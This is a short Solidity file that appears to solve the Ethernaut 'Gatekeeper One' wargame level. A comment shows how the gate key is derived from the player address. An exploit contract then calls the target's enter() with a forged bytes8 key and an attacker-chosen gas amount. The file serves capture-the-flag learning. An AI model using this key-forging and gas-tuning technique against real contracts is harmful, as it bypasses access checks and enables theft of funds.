// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// gateThree: for example, if
// key: 0xABCDEFGHIJKLMNOP
// player: 0x1eBF14FD23d0D530a7eB2605145C1b0931837E49
// then we must follow
// 0xIJKLMNOP == 0x0000MNOP => I=0, J=0, K=0, L=0
// 0xIJKLMNOP == 0x00007e49 => M=7, N=e, O=4, P=9
// 0x00000000IJKLMNOP != 0xABCDEFGHIJKLMNOP => (one way is) A=1, ... = 0

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneExploit {
    IGatekeeperOne public constant gatekeeper = IGatekeeperOne(0xca4064F7BcB6c58141ec341366038e711d8cEF46);

    function exploit(uint256 gasAmount) external {
        gatekeeper.enter{gas: gasAmount}(bytes8(uint64(0x1000000000000000 + uint16(uint160(address(msg.sender))))));
    }
}
